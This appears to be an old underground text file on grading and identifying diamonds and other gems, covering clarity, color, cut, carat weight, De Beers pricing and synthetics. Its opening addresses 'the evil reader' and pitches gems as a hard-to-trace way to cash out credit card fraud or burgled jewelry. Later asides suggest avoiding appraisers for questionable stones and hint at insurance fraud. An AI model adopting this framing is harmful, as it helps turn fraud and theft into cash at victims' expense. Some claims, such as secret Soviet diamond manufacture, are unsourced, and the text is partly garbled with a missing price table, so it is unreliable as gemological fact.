My objective with this file is to give you, the evil reader, a basic grasp of what is necessary to make money and not get burned with gems.  And believe me, you can get burned fairly easily.  So if you're just interested in this for investment reasons, or if you've carded a gem or four, or if you broke into some house and got a very nice ring, then read on.   Ok, I also want to claim full responsibity for the misuses and abuses that can be learned from this file, I do not care what laws apply to whom in what state in that part of the country, so on with the file...   THIS FILE AND CARDING                         One of the real difficulties and major drawbacks in any type of credit card fraud is actually making money from it.  And I mean aside from selling the items you card, since that is relativly risky and high profile, whereas a small bag of gems can be placed almost anywhere, and be of great value.  And believe it or not, there are places that do sell mailorder gems  The Sharper Image is a prime example, although they no longer to  I was one of their best customers too!  .  I would list some, but they tend to die quickly and they are not easy to come by.  Since they also are very hard to identify  ie, have no serial numbers , they can be sold easily in the nearest large city.  This is intended for people AT VERY LEAST 18 years old, the older the better, since I don't think little Johnny  at age 15  will get a very nice reception trying to sell four  2,500 diamonds.   DIAMONDS, EMERALDS   RUBIES  THE INSIDE STORY                                                 Gemstones, and in particular diamonds, are interesting subjects because of several factors         1. Their value is subjective, although the wholesale prices are supported          by the De Beers family and the price table is maintained through          advertising and withholding of stones. Individual stones are graded on          a subjective basis and as such, the values increase or decrease          abruptly if a further grading session disagrees with the original.        2. Gems offer a fairly stable method of converting large amounts of cash          into small, liquid, easily transported possessions.        3. It is still possible to purchase gems in some areas of the world for          substantially less money than in the United States and they can and          are smuggled into the country for profit.        4. Synthetic gemstone manufacture and faux substitutions open an area of          easy to maneuver and hard to detect high ticket fraud.    The gem and particularly diamond industry operates in a knowledge vacuum. There are a number of interesting facets, no pun intended, of buying, selling and scanning jewels that people in the jewelry business prefer not to let the public become aware of. If you are considering purchasing, investing in, or otherwise becoming involved with any sort of gem quality crystal, there are a number of things you can do to protect your investment.   DIAMONDS            For thousands of years diamonds have been a form of decoration, currency and investment medium. Diamonds have risen in price over the years fairly consist  ently with inflation. At some points investment in the right stone would have returned a much better percentage than similar amounts of stocks, bonds or gold. On the other hand, an investment in the wrong thing or an investment made blindly because of lack of knowledge, can and in many cases has caused the buyer to actually lose money.   Remember, diamonds are normally sold on a retail basis. This is where you, the consumer, buy most stones. As one purchases stones of a higher quality and larger weight, stones that are designed for investment purposes rather than ornamentation, it is possible to actually buy at or near wholesale prices. When one goes to sell the stone, if one simply walks into a jeweler or New York type diamond seller, one expects to lose from the retail price the stone may have been purchased at.   A number of factors establish the value of a diamond, one of which is the size of the stone. There are certain levels where the value of a high grade stone jumps appreciably simply because the stone is over this weight. In general, a large high rated stone is worth logarithmically more than a number of small stones equaling the larger stone's weight. It is, as one would expect, considerably harder to find flawless or near flawless large stones.   When the jeweler or professional goes to buy a stone there are several things he will evaluate in order. Generally the stone is graded using the four C's of diamond grading. These are       1. Clarity                     2. Color                                     3. Cut                                                 4. Carat weight    There are established methods and models for grading stones and one could reasonably expect to take a stone of a certain grade from one professional to another and come out with a similar rating. One should also remember this grading is subjective and there will be times when two accredited gemologists will give a different rating, possibly affecting the stone's value, by hundreds or thousands of dollars to the very same stone. It is wise to be able to at least make a good amateur estimate of the various rating points on your own instead of having to blindly depend on someone you may not know.   CLARITY           The first C is clarity. This is not the most important but is generally the first item looked at in a stone to be rated. Clarity does not refer to the concept of  being clear  with reference to a diamond. Clarity refers to the purity of the stone and lack of visible defects.   These defects or flaws or as they are properly known, inclusions, may manifest themselves as dark, black carbon spots, white carbon spots, small cracks,  clouds , feathers, or other areas of visible diffusion within a diamond or on the surface of the stone itself.   A truly flawless stone, one without any spots, cracks or inclusions, is very rare and extremely valuable. One can expect to find some flaws in most stones. The type of flaws, size of flaws, and location will have an effect upon the stone's value. It is important to learn how to judge a stone for clarity.   The Gemological Institute of America  GIA  has established a rating system for expressing the clarity of a particular stone. This rating system is based on the use of initials and numbers and goes on a one to 10 oriented system wherein 10 would be the best stone and one would be the worst stone.   This system is not expressed in simple numbers but with words and initials to further establish the rating scale. The scale is as follows       10   Flawless   no blemishes can be found.       9   VVS 1      no flaws inside the table. Possible very small internal                     flaws outside the table. If any external flaws are present,                     must be very minor.       8   VVS 2      very difficult to see flaws with 1 0x magnification power                     employed.       7   VS   1     flaws readily seen using 1 0x glass but almost impossible                     to see when the stone is viewed from from the back.       6   VS   2     the back looking down through the stone.       5   Sl   1     flaws unable to be seen with the naked eyes but quite                     apparent using 1 0x magnification.       4   Sl   2     inclusion may include carbon spots or clouds or feathers                     underneath the table or larger flaws outside of the table.     3 1   I 1 to 3   this is the least valuable group. They are heavily flawed                     and the flaws can be determined with the naked eyes. There                     are going to be internal flaws inside the table, maybe                     clouds, groups of carbon spots, feathers and or cracks                     that can be seen with the eye.                      VVS   Very, very, slightly imperfect                      VS   Very slightly imperfect                      Sl   Slightly imperfect                       I   Imperfect  A flawless stone is simply that. No flaw can be found even with the use of a 10x jeweler's loupe or 10x microscope. As you go down the scale, the VVS 1 may have one very small inclusion, generally not in the table  which I'll cover it later in the file  portion of the diamond but possibly on the edge. Again, this flaw is seen only from the front and only on using 10x magnification. It should not be visible to the naked eye.   As we get into VVS 2, there may be more than one flaw wlth magnification but they're still extremely small. One small inclusion may be in the table area of the diamond.   Into the VS grades, the flaws become larger and more prominent than their VVS cousins. VS2 may have larger flaws or a number of small spots possibly located in the table of the diamond that group together and are almost considered one flaw. They are generally in the same area.   When we talk about 10x magnification, this can be in the form of a jeweler's loupe which is a fairly inexpensive must have item for anyone serious about stones or a step upward which is the two eyepiece  stereo  microscope, which many jewelers will have on the premises and will let one borrow when perusing their stones.   It is wise to always make sure that the magnification device employed is 1Ox. This is the standard and any variation from this will affect the rating of the stone to a great degree.   Note that flawless VVS and VS rated stones are rated when looking at the stone right side up with a 1 Ox magnification device. If you pick up a stone that supposedly falls under one of these ratings and you can see inclusions with the naked eye, you're not looking at a stone that is properly rated.   An Sl 1 rated stone will have inclusions that are very obvious under 1Ox magnification, but should still be borderline visible or not visible when viewed with the naked eye. The Sl 1 stone may have these borderline visible, small dots or inclusions in the table or edge of the stone. An Sl 2 rating will have larger flaws and probably more than one. These will be easily visible to the naked eye.   In the I grades, the stones can be considered either quite flawed or imperfect. Flaws are probably inside the table. There may be flaws of more than one variety, clouds, cracks or groups of black or white carbon spots will be visible. This last group of stones obviously are the least valuable and the least interesting for anyone trying to convert from cash to gems and back again.   Looking backward we can infer several things, the first of which being if you can spot a number of inclusions without the use of magnification device, the stone is going to be graded 1, whether l 1, I 2 or l 3 is open to some subjective effort, but it will be an I rated stone.   If you can't find flaws with your eye alone but they do become visible when using a loupe, one can assume that the stone is an Sl rated stone.   The differentiation between an S stone and a VS stone is that in a VS stone inclusions may not be seen extremely clearly even with the loupe. If the stone is turned over and laid on the flat front part  the face of the stone   this is the table  and one views down from the back of the stone where all the facets come to a point and the flaws are more readily seen here, one can assume it is a VS 2 or above rated stone.   Note this viewing is done under white light and with the stone loose.  It is very difficult to judge any of the 4 C's when the stone is mounted. Mounted stones are not generally considered for investment grade purchases. The stone should be loose and one should be able to turn it freely.   COLOR         The second C used in rating diamonds is color. Diamonds come in literally every color in the rainbow and while a few specialty colored diamonds are extremely valuable because of their deep hues and unique color characteristics, these are the exceptions rather than the rule. In general, the closer a stone is to possessing no color, that is, to being colorless, the more the stone is worth.   In order to establish the transparency or lack of color in a diamond, the loose stone is placed on a pure white background under a white light. There are special lights sold with adjusted color temperatures for this viewing or some people prefer to use the soft north sunlight when trying to view the color of a diamond.   In color rating as in clarity rating, the dazzling brilliance and fire of a diamond are the viewer's natural enemy. They will confuse the eye and care must be exercised to not become jaded or tricked, but rather to view each characteristic individually and in comparison to other stones or photographs of stones.   The most accepted color grading system is that again of the GIA.  Their system is judged by using a series of master stones sold by the GIA or their representatives that establish hues and tints and can be laid side by side with the stone in question in order to view how  white  the stone really is.   If at all possible, it is certainly worth one's time to visit a large gem dealer with the intent or apparent intent of purchasing a goodsized stone and ask to see a master set and become used to judging the color on several stones until you have a feel for the concept of whiteness, transparency and hues.   Technology has now produced a practical and inexpensive  comparatively  method of possessing your own diamond master stones. These stones are available in all colors D through Z on the GIA scale and are excellent to have on hand to compare with any other stone you may be considering purchasing in order to rate the new stone. These stones are color correct because they're created to be exactly the color they're supposed to be.   How can this be cheap  The stones are not diamonds. They're CZ's, cubic zirconia. These CZ stones look like diamonds, act like diamonds, smell like diamonds and can be matched to a real diamond in order to compare colors with an extreme degree of accuracy. A five stone set with a color test box is  300 from                 Danley Trading Corporation                580 Fifth Ave.                30th Floor                New York, NY 10036                800 227 2079  There's also a device known as a color meter which electronically measures the color or lack of color in a stone. This meter is quite accurate although fairly hard to come by unless one is a member of the Gemological Institute of America.   The GIA color rating system has been established using alphabetical nomenclature. The stones are rated from pure  totally colorless  down through a sliding scale to yellow, which is the least valuable stone. The GIA color rating system starts with the letter D and progresses through the alphabet as shown below to Z, which would be very yellow.                A B C D E F    Colorless                   G H I J    Near Colorless                       K L    Faint                         M    Yellow White                       N O    Very Light Yellow                         P    Light Yellow                         Q    Yellow                   R S T U    Light                         V    Yellow to Fancy                         W    Fancy                     X Y Z    Yellow  After the letter Z, indicators are used to suggest the stone is more valuable because of its hue  i.e., a  fancy  color. As you can see from the above chart, D, E and F stones are considered completely colorless. G, H, I and J are near colorless stones and take a lot of practice for the amateur to see any color at all, while after J the stones begin to pick up a small tint of yellow that is noticeable to practiced gemologists.   To correctly grade a gemstone, the stone must be loose, not in a setting, should be on a perfectly white background, should have a white gem quality temperature light and should be viewed from the rear of the stone. In other words, the stone should be upside down Iying on its table. It is also extremely helpful to have stones of known color grades nearby for active comparison.   Never attempt to judge the color of a diamond when it is set in any kind of setting, be it earring, ring, or whatever as it is strictly impossible to judge the color of a mounted stone that is taking on hues and tints from the mounting itself.   Color is a very important consideration in choosing investment quality diamonds and, in fact, the differences in large sizes such as one carat and over from a D to an E color  again these are the top rated stones and are both considered colorless to the naked eye  can be double the price between these two grades. . .   CUT       Bear in mind also that a good diamond cutter can cut a colored stone in order to make it appear whiter than it is WHEN THE STONE IS MOUNTED by doing a shallower cut that's more spread on the point where the facets come together. This will make the stone appear less yellow, again only after it's mounted. This is another reason one should never judge a stone that is in a mounting of any sort.   The cut of a brilliant diamond may be the most singular important consideration in buying a stone within a set price range. Unless one is an expert and feels his knowledge is good enough to override general public consideration, there is only one cut to consider and that is the  brilliant  cut. Brilliant cut is a modern cut that is a completely round stone designed with 58 facets to maximize light reflection and  fire  within a diamond.   There are a lot of stones still around which have what is known as a European cut. This cut was done in the 1920's and before and does not compare in value to the modern brilliant cut. The old cut or European cut stones were cut before exact ratios and angles were established and understood by the gem cutting society and, as such, do not maximize the reflecting and refraction qualities of the stone. European cut stones such as those purchased at pawn shops and estate sales, are much harder to resell and do not offer the liquidity of a brilliant cut diamond.   There are other popular modern cuts such as the marquise, the oval and the pear which attract some buyers when designed for jewelry, due to their unique appearance. These cuts do not reflect as well as the brilliant cut and are rarely seen in investment quality jewelry.  Again, the fancier cuts will be on the average much harder to sell  definitely harder to sell to a dealer  than is the round brilliant cut stone.   Fancy cut diamonds have fewer angles cut to what is known as the  critical angle  and, as such, cannot be as brilliant as a round cut stone. The fancier a stone is, the more it differs from a brilliant cut, the greater the loss in light reflection will be.   Another phenomena to be aware of in fancy cut stones such as pear shapes or marquise shapes, is something called the bow tie effect.  This is a dark, cloudy area across the upper portion of the table on these stones. It is a quality inherent in the cutting and looks like a cloudy bow tie across the reflecting portion of the table. This obviously lowers the value of the stone considerably and, if one is thinking about a fancy cut stone, this effect should be taken into consideration.   Fancy cut stones have only two bottom facets as opposed to the eight found in round cut stones to reflect the light back. While they still may appear to be fairly brilliant, the refraction, the fire of the stone, will suffer critically. This loss progresses from the marquise cut through the straight cuts such as the emerald cut diamond. These straight cut stones suffer a great light and fire loss and are not nearly as valuable as the same stone would be cut in a brilliant cut.   An uncut diamond is normally sawn or split into two or more stones as decided by the diamond cutter. It just takes a simple error here to completely ruin a valuable stone and turn it into nothing but dust. Now you can understand the hypertension rate among diamond cutters and airport controllers...   Once a rough diamond is split, the diamond cutter then decides how the stone will be laid out and cut. This operation means that a certain portion of the diamond will be ground off and lost and so this cut plan becomes an important step in finishing the final stone.   The first step taken by the diamond cutter is to girdle the diamond.  This process of girdling establishes the size of the stone and puts a  waste  on the stone  see the diagram . If a stone is poorly girdled, it will not appear completely round when viewed with the jeweler's loupe or microscope. A round brilliant cut stone should be perfectly round and symmetrical.   Other mistakes in girdling will produce flaws that manifest themselves as a razor thin girdle which is prone to chipping or breaking  even though diamonds are extremely hard, they are brittle and can be chipped or shattered in thin areas . A too thick girdle takes away from the brilliance and fire of a stone and indicates a poor job on the part of the diamond cutter.   A diamond cutter cuts  in a brilliant cut  58 facets all done on exact angles in exact positions in order to let the diamond reflect as much light as is physically possible. The brilliant cut stone has 16 facets on top and 16 facets on the bottom that reflect the light and give the stone its cut. Each facet is cut on a unique angle and is exactly straight when viewed with other facets in order to maximize light reflection.   When you view a brilliant cut stone, around the table of the stone you'll see the kite and the topmain facets. These facets are the areas that allow the light to come through to the viewer. Beneath these you have eight star facets and then 16 upper girdle facets before you reach the girdle itself. Beneath the girdle you have an additional 16 lower girdle facets. All these ancillary facets contribute to the light reflection through the kite and top main facets and the table portion of the stone.   What is the advantage of the 58 facet brilliant cut stone  What does one expect to see when viewing a diamond  There are two qualities that make a diamond attractive to the eye. The first one is known as life and indicates the amount of light that is reflected back from the diamond to the viewer. The second quality is known as fire, which is an indication of the amount of refraction from the facets and split into colors as in a prism effect.   Besides the 58 facets, a number of other factors contribute to the perfectness of a brilliant cut stone. The stone's table should be 53  of the area of the stone. While the ratio between the depth of the stone or the length of the stone if you view it from the side, to the spread of the stone which is the maximum diameter of the girdle, this ratio should be 60  depth to spread.   The angles on a stone must be cut exactly to critical angles. Any deviation will produce a less than perfect reflection of the light waves entering the stone. A jeweler will have special gauges to measure these angles. These gauges are available but they are expensive. Or one can buy a loupe that is marked with angle markings  about  50 from suppliers like Edmund Scientific . When angles are viewed through this loupe, they can be accurately measured .   The first measurement to take is the degree of the angle from the table to the girdle of the stone. This is known as the top critical angle and should be 34 1 2 degrees. Underneath the girdle, the bottom angle from the girdle to the point of the stone is also a critical angle and should be cut at 40 3 4 degrees. A further measurement is that the girdle should be about 1  as thick as the diameter of the stone, although this is not quite as critical as the other measurements and can be judged by the eye after a bit of practice.   A stone which is not cut with the critical angles in the right degree, will either be shallow cut or deep cut and will not reflect the light back through the center of the stone  the table of the stone  with the same brilliance as a stone that is cut to the correct angles.   If the stone is shallow cut, the light will reflect off the edges of the stone but not through the middle. If it is cut too deeply, the center of the stone will appear to be dark and it is called  heavy.  In the past some cutters cut the upper angles at a less than 30 degree cut. This  spread cut  helps hide deficiencies in a stone but makes the girdle angles sharp and likely to be broken or chipped and the stone is not as valuable as a normally cut stone.   If the correct tool for sizing angles is not available, one can estimate that if the table appears to be larger than it should, and the width to height  that is the depth spread ratio  is below 60 , one can assume that the critical crown angles are shallow.   It is possible to polish a diamond to a high degree to compensate for shallow or deep cut angles at first glance and make the stone appear to be more brilliant than it, in fact, is. If the stone is chosen for investment quality, a measurement of these angles is almost essential .   CARAT WEIGHT                The fourth and final C in evaluating a diamond for purchase is the carat weight. The term carat is a reference to biblical times when diamonds were compared against a carob bean because carob beans tend to have a uniform size and weight. One carob bean became the equivalent of one carat. The carat is still the primary unit of diamond weight used today. However, a carat is further broken down into 100 sub units called points. One point equals 1 100 of a carat.   When you buy diamonds it is often mentally economical to break the price of the stone down to a per carat basis. A rather crude example would be if you were buying drugs you would break the price of a kilo down into a gram weight to establish what you are actually paying per unit. The same is true in diamonds. You should divide the weight of the diamond into the price to get the carat weight.   The next thing to realize is that carat weights do not follow a linear progression in terms of price. There are certain man made break points in diamond pricing. The first break is at .50  1 2  of a carat. The second break is at 1 carat and then succeeding breaks occur at each carat thereafter.   These breaks, although arbritrary, are valid and a diamond that is .52 of a carat will cost considerably more than a diamond that is .44 of a carat. A diamond that is over 1 carat, say 1.03 carats, will cost considerably more per point or per carat than would a diamond that is .94. Because this break is so critical, one should always see a diamond weighed in front of one on a scale that has been verified by using an accurate unit of measure. In other words, put a one gram weight on the scale and see if it actually reads one gram.   Because of the price involved, these break points are quite important and one does not want to pay the price differential for over a 1 carat diamond for one that's actually a couple points under. When it comes time for resale, the next buyer will not be so generous in his consideration of the weight.   These price breaks are very substantial and are one of the few things in diamond selling that is not subjective. As such they are quite evident in all diamond sales. The difference per carat weight in a diamond that weighs from 1 to 2 carats may be as much as  1,000 per carat or more, on a 2 to 3 carat diamond. This holds true on a 3 to 4 carat diamond also. One could expect to pay not  1,000 more but  1,000 per carat more. This tends to increase as one gets into the heavier weights and good grades of stones because the stones become much rarer. It is much easier to find small good stones than it is to find large stones of the same quality.   Wholesalers and for that matter, diamond retailers, buy their diamonds on a per carat basis and if you are going to buy from anyone in the business, you should consider the stone in that same light.   It is practically impossible to quote diamond prices in a paper like this because they are subject to change and market fluctuations.  Retail diamond prices are also subject to seasonal conditions and one will find that holidays and gift giving times such as Christmas tend to bring about severe prices from retail outlets while the spring and summer months will often evoke a more favorable estimate from a retailer who needs to make his rent that month.   Wholesale diamond prices should not change too much due to seasons or gift giving times. Wholesale prices will vary when the market demands exceed supply and also tend, as with gold, to function somewhat independently and opposite of  soft  currency such as the dollar.   The price one pays is determined by how much the seller wants to sell the stone and how much the buyer wants to buy it. Obviously in certain situations, stones are cheaper than they would be in a high markup area such as with a retail jeweler.   A stone may come with an appraisal sheet from one of the two gemological societies recognized in America. This sheet, as we have seen, details a number of qualities about the stone and will establish an appraised price. A couple things one should be aware of about appraisals  the first is that they're invalid generally.   Appraisals are an instrument designed for insurance companies to establish a possible price on a diamond that includes a number of factors such as increase in value during ownership. The appraisal sheet will be inflated over the value of the diamond. One never expects to pay full appraisal price for a diamond and if one does, the term  saw you coming  falls quite aptly into place.   Appraisals also vary from person to person even with accredited gemologists. The same stone can bring about two entirely separate appraisals that may differ in value by hundreds or even thousands of dollars. Again, the appraisal is a piece of paper that allows the insurance company to set a value on the stone, not that the insurance company will necessarily pay off the appraisal at full price either.   One cannot make a living by buying diamonds, having them appraised and then reporting them to the insurance company for too long.   Appraisals, on a very general basis, tend to be nearly double the price that a stone will actually sell for. This is a very wide statement and some appraisals will, of course, be closer to the actual value of the stone than will others.   Appraisals cost money and if you are good enough to sell the qualities of the stone after a little bit of practice, your own word and your own peace of mind will be more valid than a piece of paper.  You are buying a piece of paper that someone else may not want to buy.   One should actually consider that one is buying the stone, not a piece of paper telling one how valuable the stone is. This could be compared to buying a car because the owner wrote an article about how exciting the car was. Needless to say one should base the actual purchase price on the vehicle itself...   Reasons for getting an accredited appraisal are having the stone you want insured, or when you go to sell the stone, having an appraisal that verifies the stone's quality to an unsophisticated buyer and that lists the price considerably higher than you actually expect to get for the stone, which may help sell the stone.   This is a nice line of thinking as long as you are the seller and not the buyer. This is a buyer beware type of business and you should know what you're getting and should take all safeguards possible to insure you're getting what you think you are. If you're buying in a slightly dubious situation and perhaps are not as concerned with the stone's pedigree as some people would be, you should be prepared to never see the seller again and live or die on your evaluation of the stone, not a piece of paper from an appraiser.   It should also be pointed out that in certain situations one would not want to take a stone in to an appraiser. I will leave this to the imagination of the reader.   Although appraisals are intended for an insurance company's benefit, one should realize that if an insured stone is stolen or otherwise destroyed, the insurance company may want additional information regarding the purchase of the stone along with an independent appraisal. There are exceptions to this rule. If this stone was a gift or was left to one in an estate, obviously an appraisal becomes the primary instrument of value determination and, as such, is extremely useful to have on hand.   As a sidebar here, there are ways of destroying or damaging a diamond, even though a diamond is one of the hardest materials known to man. As previously pointed out, they are brittle. If you strike a diamond with a hammer, you'll dissolve it into useless industrial dust. If you touch a diamond to an acetylene torch of significant temperature, you will observe an extremely interesting and costly phenomenon where the diamond turns back into the same black carbon that it came from.   Graphite, in other words. Once this happens the only recourse is to hope the diamond was large enough to burn in the furnace and get some heat because there is no way of changing it back quite as readily to its crystalline form.   DIAMOND  AVAILABILITY AND PRICES                                    Diamonds are found literally the world over from black specimens in Brazil to flawless whites in Arkansas. Unquestionably the largest supply of diamonds comes from South Africa where the mines are owned and run by the De Beers family and have been for a number of years. The De Beers closely guard both the stones and information about their production.   Diamonds are found typically in a type of formation known as a pipe because of its resemblance to a pipe driven vertically in the ground. The top part of the pipe normally contains  yellow earth  which contains natural stones which can be fairly easiiy crumbled and separated out by specific gravity and the fact that diamonds stick to grease. Most stones do not.   Once the yellow earth pushed from the pipe is used up, the second section is known as  blue earth.  This is a much harder, clay like material that at first was thought to contain no diamonds and be too hard to crack open because any diamonds inside would be smashed by the cracking process. It was later discovered this clay like material dries in the sun or under artificial heat to a consistency that allows it to be crumbled. It does contain as many or more stones as the yellow earth section of the pipe does.   The De Beers have a unique position, more so than any other firm in any other field of commodities. They literally control the price and availability of diamonds the world over. They do this through something called the Central Selling Organization  CSO . The CSO literally controls the sales of almost all gem quality diamonds in the world.   They allow sales in a unique ceremony known as a sight allocation where upon a De Beers authorized dealer is allowed to buy a certain number of stones they select, wrap and deliver to him at a price they set. This is not an offering but a take it or leave it situation and if one leaves too many finally De Beer or CSO no longer deals with that particular person. He will no longer be a sight holder. This relationship between the sight holders and the CSO is an instrument to instill fear in the wholesaler who depends upon a single supplier.   The CSO, in order to maintain its level of prices, buys or guarantees to buy all natural diamonds produced in the world. They do this in order to maintain an exact supply and demand ratio they feel is advantageous to the market.   Extra stones are stored in bank vaults, supposedly in London and a few other countries and only marketed when the supply for them increases. De Beers and their organization, the CSO, do not make public exactly how many diamonds are being produced and how many are being released or what the price would fall to if the natural odds of supply and demand took over, rather than the structured sales organization.   For example, current gem prices are as follows           Prices are approximate current wholesale purchase prices         paid by retail jewelers on a per stone basis.

SINGLE STONE IDENTIFICATION                               The odds on finding an uncut diamond, unless one happens to be walking on a patrolled, electrified, mined and guard dog guarded beach in South Africa, are fairly rare. However, uncut diamonds have a number of characteristics that lend ease to their identification.   They normally appear as cloudy, white or slightly colored pebbles with a unique coal, greasy feel to the touch as they are excellent conductors of heat. Natural diamonds can be dipped in water and will not remain  wet . The water does not stick to the surface. These diamonds do, however, stick to common axle grease when passed over them, but most stones will not.   Natural diamonds also occur as crystals and normally have at least one side of the crystal that is flat and appears as a facet. Sometimes more than one side will take on this characteristic.   Positive identification of diamonds or other gems is achieved by a number of more scientific methods. Specific gravity is a good place to start. This concept is very simple. It is based upon the weight of a certain material in relation to the weight in an equal volume of water.   If the material has a specific gravity of four, it will weigh four times as much as with that much water. Specific gravity is usually checked by using weighing scales that allow suspension of the specimen. First it's weighed in air, then it's weighed in water. The weight in water subtracted from the weight in air with the quotient divided into the weight in air. This gives the specific gravity of the material.   Most gem materials have a specific gravity of less than four. If somebody wants an accurate but fairly fast method, he can produce a few heavy liquids and bottle them to suit his needs. There are a number of liquids such as tetrabromo ethane and methylene iodine that will work. The first having a specific rate of 2.95 that can be diluted with kerosene to any gravity one wishes and the second, 3.33. It can be diluted with toluene to produce a series of liquids of certain gravities in between. Leaving the material in question in the bottle, you can tell at a glance if correct and what the specific gravity and the density is.   The specific gravity of diamonds varies slightly depending on where the diamond came from but will fall between 3.50 and 3.53.   The next reliable indicator used is a scale of hardness indicator. As most people realize, diamonds are the hardest stone in the world. The hardness scale normally refers to something called Mohs hardness.   The Mohs scale is a 0   10 scale. There is another scale that's 0  15 making it easier to differentiate between the marginal gems that fall between 9   10, but the Mohs scale is primarily in use.   Hardness simply refers to the ability of one material to scratch another. Harder material always scratches a softer material.   The difficulty in making the scratch or appearance does not come into play. Simply the fact that it can be made.   It should be pointed out that the Mohs scale does not correlate to the relative hardness of the materials. In other words, a diamond is not something that is 10x harder than something that is a 1 on the scale. The scale is simply there to present a basis on which, when a material is scratched, another material can be identified as harder.   Diamonds are a 10 on the hardness scale. Quartz is a 7 on the hardness scale as are most types of tourmaline. Most garnets are 7 1 4 on the scale. Synthetic emerald tends to be 7 1 4 to 7 1 2. Silicon carbide is a 9 1 4 to 9 1 2 on the scale, meaning it will not scratch diamond and diamond will scratch it.   Opals begin at 4 1 2 and go up through 5 on the scale while turquoise is 5. Rubies are 9 on the hardness scale.   It is also possible to set a piece of gem material between two Polaroid plates that are set so that no light may be seen between them. The lower plate that the gem sits on is known as a polarizer. The upper plate is the analyzer. The polarizer is fixed but the analyzer is rotated.   If during a complete rotation, the material remains dark with no change, it is called isotropic. If it is nonisotropic, it will change from light to dark four times during a complete rotation. The normal nonisotropic pattern is a sharp cutoff from light to dark, much as extinguishing a fire. By doing this with a gem, it is possible to establish a refractive index.   However, this is a fairly mind boggling exercise and there are easier ways to tell, at least with diamonds.   All precious stones have bad name counterparts, some of which are better than others. Synthetic stones  or by the correct name  created gems   are defined by law as  chemically, physically and optically  the same as real gemstones.   They are more expensive than imitation or faux stones which don't have the real characteristics but they're considerably cheaper than natural stones of the same variety. As long ago as in Victorian times, the French were creating synthetic rubies, emeralds and sapphires, which is a surprise to some people who buy estate jewelry thinking it contains a real stone only to find it is a synthetic stone.   Today's methods are definitely more sophisticated and create gems so good that only trained jewelers and gemologists can tell them apart from their natural cousins... IF THEN!   It's possible to create flaws in a created stone although it's more common to see created stones being too flawless or too perfect to be true.   Manmade diamonds have existed for years although they have primarily been of industrial quality. Scientists have claimed it is impossible to make gem quality diamonds. This is not true. About 25 years ago General Electric discovered it could make perfect, flawless gem quality diamonds which were impossible to tell from their natural cousins. They decided not to continue the experiment in any mass version because it was  economically unfeasible.    In the 1950's the Soviets discovered a large diamond pipe in Siberia and began producing gem quality diamonds. In 1962 the CSP decided to buy all uncut diamonds produced by the Soviet Union as to allow them to be under De Beers price control. They expected that, based on comparisons with their own mines in South Africa, the Soviets would begin to run out of diamonds in about 1970 and, therfore, they could afford to buy all the diamonds they would produce.   Approximately once a month, a chartered aircraft lands in London and  50,000,000 worth of diamonds are turned over to De Beers Diamond Trading Company for the equivalent hard currency.   De Beers is not very fond of this arrangement but they feel they must do it in order to keep up the diamond prices.   However, an unusual development occurred to the shock of the De Beers. The size of the Soviet shipments did not stop in 1970 but rather increased dramatically between 1970 and 1975, besides which the diamonds seemed to be very homogenous in character, averaging 1 4 carat, flawless with sharp, angular edges and a slight green tint. The Soviet diamonds seemed to be remarkably uniform in size and shape and, unlike their African counterparts, did not come in a multitude of round, square, flat, triangular or twisted shapes but rather ere octahedons.   Coincidentally, the Soviets, under some pressure, have admitted they, with a group of 1200 researchers, developed a way to manufacture a flawless gem quality diamond. This process was officially developed in the 1960's by one Leonoid Veres Yagin. The Soviets claim they are not manufacturing these gems but they are natural gems that they keep selling to De Beers.   American agencies, after numerous requests, were finally allowed to visit the Siberian mine and found it hopelessly inadequate in size and facilities to process even more than a fraction of the diamonds the Soviets are showing the De Beers. The De Beers insist these diamonds are natural and deny the Soviets have the capability to flood the diamond market with a virtually unlimited supply...   Besides these man made natural diamonds, there is the problem of cubic zirconia or CZ. It is usually sold under a trade name such as Zirconia, Phyanite and Diamonique. Technically, CZ is not a synthetic diamond but it is a crystallization of the chemical zirconia that, when cut, has most of the optical characteristics of a diamond.   CZ is not as hard as a diamond and it does have a different specific gravity. It takes 1.70 carat CZ to equal 1 carat diamond in weight.   CZs, however, in the last few years, have become increasingly close to diamonds and good CZs are impossible to tell from diamonds by the eye. In fact, we had several gemologists look at unmounted CZ and unmounted diamonds, and they admitted they could not tell the difference. The only one who did pick out the CZ with some regularity was because, he said, the stones were too flawless to be diamonds...   Hardly a reliable way to judge stones.   As one can see, the potential for fraudulent misuse of CZ is quite high and there have been a number of occasions where people were sold CZ instead of diamonds, turned their diamond rings into unscrupulous jewelers or gemologists, only to have CZ put in the same mountings and returned to them. There have been a number of cases of people looking at diamonds in a jewelry store, and with a quick distraction, replacing the diamond in full view of the jeweler with a CZ and giving that back instead. These will pass on sight.  How do you tell a CZ from a diamond  Well, luckily technology has come to the rescue. There are a number of devices on the market that, for under  150, will electronically test the material to see if it is a diamond or not. Diamonds have unique electrical resistance patterns and CZ have their own. These devices are simply touched to the material in question and will tell if it is a diamond or a CZ. It is a good thing to have on hand if one plans on dealing in gems.   There are a couple of different systems for forming synthetic rubies and emeralds. One is to use a seed chip of the natural stone and then combine chemicals, heat and pressure to  grow  rubies and emeralds. The latest processes are known as flux processes, which combine heat and or pressure to work on the ingredients composing the gemestone to be synthesized.  The ingredients are fairly easy to come by  i.e., carbon for diamonds or beryl for emeralds.    These flux processes are designed to produce richly colored stones and almost always do. They usually have greater clarity than the natural variety although sometimes offer distinguishing inclusions which telltale their origin.   The most famous emeralds are probably Chatham synthetics which grow in a group of crystals. They were first grown in 1935 by Caroll Chatham of San Francisco. The Chatham family still grows these gems but doesn't care to discuss the process. The Chatham emerald sometimes has small spicule inclusions on the face of the facets as a result of the crystal forming solution.   Gillson is another variety of snythetic emerald. There is also a Japanese gentleman by the name of Kazuo Inamora, President of Kyoto Ceramics, who has three showrooms in Japan and one in Beverly Hills selling  created  rubies and emeralds. These created stones have caught on quite well in other countries including Japan and may or many not catch on here. As you can see by my chart, the price difference between the synthetic and the natural stones is quite great.   Once again, we've had experience with Chatham's emeralds and have had a number of gemologists that had great difficulty telling the natural emerald from the Chatham emerald. In many cases, they both would have passed off as natural stones.

